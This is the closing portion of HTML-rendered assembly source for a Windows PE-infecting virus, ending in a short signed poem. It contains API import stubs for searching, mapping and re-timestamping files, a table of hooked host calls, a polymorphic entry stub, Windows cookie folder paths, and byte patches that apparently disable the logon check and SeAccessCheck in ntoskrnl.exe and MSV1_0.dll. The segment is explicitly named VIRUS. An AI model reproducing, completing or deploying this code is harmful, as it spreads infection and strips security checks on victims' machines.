             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DosDateTimeToFileTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'DosDateTimeToFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetDriveTypeA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetDriveTypeA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetLocalTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FileTimeToDosDateTime</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FileTimeToDosDateTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SetFileTime</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_llseek</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_llseek'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lopen</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lopen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lread</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lclose</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_lwrite</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'_lwrite'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">W9x_GPA_Key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">0D2</span><span class="sc0">

</span><span class="sc5">WNT_GPA_Key</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">4C</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">

</span><span class="sc5">RMul</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">07FFFFD9h</span><span class="sc0">

</span><span class="sc5">RDiv</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0FFFFFFFBh</span><span class="sc0">

</span><span class="sc5">NTLDR</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc12">':\NTLDR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NTOSKRNL</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc12">':\WINNT\system32\ntoskrnl.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MSV1_0</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc12">':\WINNT\system32\MSV1_0.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OldFileCheck</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">OldSeAccessC</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">8A</span><span class="sc4">,</span><span class="sc2">0C3</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">OldWriteFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">OldLogonTest</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">84</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">

</span><span class="sc5">NewFileCheck</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">NewSeAccessC</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">NewWriteFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">85</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc5">NewLogonTest</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">84</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">

</span><span class="sc5">CookiesDir1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\WINDOWS\Cookies\*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CookiesDir2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'\WINNT\Cookies\*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The HostCalls has this structure :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     item 1 - address of the 1st call hooked by the virus</span><span class="sc0">
</span><span class="sc1">;            - the original value of the call (where ExitVS jumps);</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     item 2 : same</span><span class="sc0">
</span><span class="sc1">;     item 3 : same</span><span class="sc0">
</span><span class="sc1">;            </span><span class="sc0">
</span><span class="sc1">;         ....</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">



</span><span class="sc5">HostCalls</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirCall</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostRoutine</span><span class="sc0">

             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc4">(</span><span class="sc5">NbHooks</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hooker contains the Poly address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Hooker</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Poly</span><span class="sc0">


</span><span class="sc9">ALIGN</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the initialized code &amp; data of the virus end here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">EndOfCode</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Here stands the polymorphic routine.</span><span class="sc0">
</span><span class="sc1">; As the virus here is not encrypted,</span><span class="sc0">
</span><span class="sc1">; it'll just jump to the start of the virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Poly</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">pushad</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc5">VS</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">400</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">RandNb</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">K32_Base</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ThreadID</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">CDirEnd</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MapHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MapBase</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileDate</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileTime</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">SelF</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">B1A</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">B2A</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">HCA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">BytesRead</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">GarbageSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">BlankSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">ImageBase</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">VirusOffset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">VirusAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">VStart</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">LoopStart</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Code_Offset</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Code_Size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Code_RVA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Code_Loc</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">LastSSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FileSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Key1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Key2</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Reg32_A</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Reg32_B</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Reg32_C</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">_Filename</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Signature</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Patch</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">PatchSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">Somewhere</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc5">NbHooks</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">CurrentDir</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Buffer1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">Buffer2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">800</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">EndOfVirus</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">IDATSize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndOfCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">

</span><span class="sc5">VSIZE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndOfVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">

</span><span class="sc5">RawVSize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc5">VSIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VSIZE</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">



</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc9">END</span><span class="sc0">          </span><span class="sc5">MAIN</span><span class="sc0">



















































</span><span class="sc1">;          Up above the world you fly,</span><span class="sc0">
</span><span class="sc1">;          Like a tea-tray in the sky.</span><span class="sc0">
</span><span class="sc1">;          Twinkle, twinkle -</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                             L.C.</span><span class="sc0">













</span></div></body>
</html>
